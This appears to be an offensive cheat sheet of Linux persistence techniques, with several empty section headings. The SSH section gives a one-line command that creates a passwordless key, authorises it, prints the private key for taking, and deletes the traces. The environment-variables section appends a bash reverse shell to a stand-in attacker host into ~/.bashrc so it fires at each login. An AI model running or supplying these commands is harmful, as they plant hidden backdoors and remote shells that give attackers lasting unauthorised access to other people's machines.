# SSH Keys
#### Generate an SSH key pair
```
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N ""
```
#### Add the public key to the `authorized_keys` file
```
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```
#### Clean up
```
rm ~/.ssh/id_rsa ~/.ssh/id_rsa.pub
```
#### One-line command
```
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N ""; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys; cat ~/.ssh/id_rsa; rm ~/.ssh/id_rsa ~/.ssh/id_rsa.pub
```
# Cron Jobs

# Environment Variables
Add a command to the user's `.bashrc` or `.profile`
```
echo 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1' >> ~/.bashrc
```
# AutoStart Applications


# SUID Binaries


# Web Shells


# Shared Library



